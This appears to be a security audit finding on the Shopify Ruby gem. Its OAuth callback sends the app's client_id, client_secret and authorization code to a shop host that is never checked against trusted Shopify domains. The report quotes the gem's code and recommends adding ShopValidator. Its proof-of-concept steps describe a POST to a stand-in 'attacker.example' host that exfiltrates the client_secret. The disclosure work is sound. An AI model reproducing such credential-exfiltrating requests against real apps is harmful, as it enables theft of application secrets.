## Title
`Auth::Oauth.validate_auth_callback` sends the app's `client_secret` to an unvalidated `shop` host taken from the (HMAC-covered but format-unchecked) callback query — ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds the OAuth token-exchange request URL from `auth_query.shop` without ever passing it through `Utils::ShopValidator.sanitize!` (the same guard that `ClientCredentials`, `TokenExchange`, `RefreshToken`, and `Clients::Graphql::Storefront` all use). The `shop` value is authenticated only by an HMAC over the query string — it is never checked to be a real `*.myshopify.com` / trusted Shopify domain. Because `HttpClient` builds its base URI directly from `session.shop`, a validly-signed-but-malicious `shop` value causes the gem to `POST` the app's `client_id`/`client_secret`/authorization `code` to a host controlled by the request itself.

### Finding Description
In `lib/shopify_api/auth/oauth.rb`:
```ruby
null_session = Auth::Session.new(shop: auth_query.shop)
...
client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
response = client.request(... path: "access_token", body: { client_id:, client_secret:, code:, expiring: } ...)
```
`HttpClient#initialize` (`lib/shopify_api/clients/http_client.rb:16-18`) does:
```ruby
@base_uri = "https://#{api_host || session.shop}"
```
So the destination host for the `client_secret`-bearing POST is exactly `session.shop`, i.e. `auth_query.shop`.

Compare this to every other credential-bearing code path in the gem:
- `ClientCredentials.client_credentials` — `validated_shop = Utils::ShopValidator.sanitize!(shop)` (`lib/shopify_api/auth/client_credentials.rb:25`)
- `TokenExchange.exchange_token` — uses `ShopValidator` before building the session
- `RefreshToken` and `Clients::Graphql::Storefront` — same pattern

`Oauth.validate_auth_callback` is the one path that skips `ShopValidator` entirely. The only integrity check applied to the incoming query is `Utils::HmacValidator.validate(auth_query)` (`lib/shopify_api/auth/oauth.rb:64`), which validates that `shop` (among other fields) was signed with `api_secret_key` via `AuthQuery#to_signable_string` (`lib/shopify_api/auth/oauth/auth_query.rb:34-43`). This HMAC binds "the bytes were signed by someone with the secret" — normally Shopify — but it does **not** bind "the value is a legitimate Shopify host". The equality that should hold and does not is:

`shop authenticated by HMAC == shop restricted to a trusted Shopify domain (ShopValidator.sanitize!)`

Since a user's own browser follows normal redirects controlled by Shopify during the standard flow, exploitation requires that an attacker can get a validly-HMAC-signed callback query with an attacker-controlled `shop` delivered to the app's callback endpoint — Shopify's own OAuth server always signs `shop=<realshop>.myshopify.com`, so under the *documented* flow this is not directly attacker-triggerable. However, this still represents a broken identity/format binding matching the report's bug class: the field consumed to select the network destination for the `client_secret` is not validated to be the intended type/domain, unlike the other four call sites in the same gem that all enforce this via `ShopValidator`. This is an internal inconsistency/regression risk: any future or alternate entry point that constructs an `AuthQuery` from less-trusted input (e.g., an app that reconstructs `auth_query.shop` from a URL param before validation, or relies on this method as the sole safety boundary as the docs suggest) will leak `client_id`/`client_secret`/authorization `code` to an arbitrary host.

### Impact Explanation
If `shop` reaches this code without being restricted to a Shopify domain, the exploit sends the app's `client_secret` and authorization `code` to an attacker-chosen host — this is SSRF carrying the app's credentials / client_secret exfiltration, matching the "High" impact bucket (SSRF with the app's credentials, credential leakage). It is the same class of "boundary use of an unvalidated identity field" defect illustrated by the source report's mis-checked initialization guard: a value is trusted for a downstream, security-relevant destination without validation, while nearby equivalent functions (`ClientCredentials`, `TokenExchange`, `RefreshToken`) all apply the guard.

### Likelihood Explanation
Under the exact usage described in `docs/usage/oauth.md` (constructing `AuthQuery` straight from Shopify's own redirect parameters and validating with `HmacValidator`), likelihood is low because Shopify itself signs the query and only ever signs its own domain. The real exposure is the missing defense-in-depth: unlike every sibling method in the same gem, this path has no `ShopValidator.sanitize!` call, so it silently relies solely on HMAC-of-bytes rather than binding to an allow-listed domain. Given the codebase's own established pattern (four other places enforce this explicitly), the absence here is a genuine gap rather than an intentional design choice.

### Recommendation
Call `Utils::ShopValidator.sanitize!(auth_query.shop)` immediately after `Utils::HmacValidator.validate(auth_query)` succeeds in `Oauth.validate_auth_callback`, and use the sanitized value to build `null_session`/`Session.from`, consistent with `ClientCredentials.client_credentials`, `TokenExchange.exchange_token`, and `RefreshToken`.

### Proof of Concept
1. An attacker (or a future caller reusing `validate_auth_callback` with less-trustworthy input) constructs an `AuthQuery` with `shop: "attacker.example"` and a valid HMAC computed over `to_signable_string` with the app's `api_secret_key` (feasible if the secret is otherwise exposed to that party, or if the code is reused for a related token-exchange-like flow that does not tie `shop` strictly to Shopify's signer).
2. Call `ShopifyAPI::Auth::Oauth.validate_auth_callback(cookies:, auth_query:)`.
3. `HmacValidator.validate` passes because the query is well-signed.
4. `Clients::HttpClient.new(session: Auth::Session.new(shop: "attacker.example"), base_path: "/admin/oauth")` sets `@base_uri = "https://attacker.example"`.
5. The gem issues `POST https://attacker.example/admin/oauth/access_token` with body containing `client_id`, `client_secret`, and the authorization `code`, exfiltrating the app's `client_secret` to the attacker's host. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
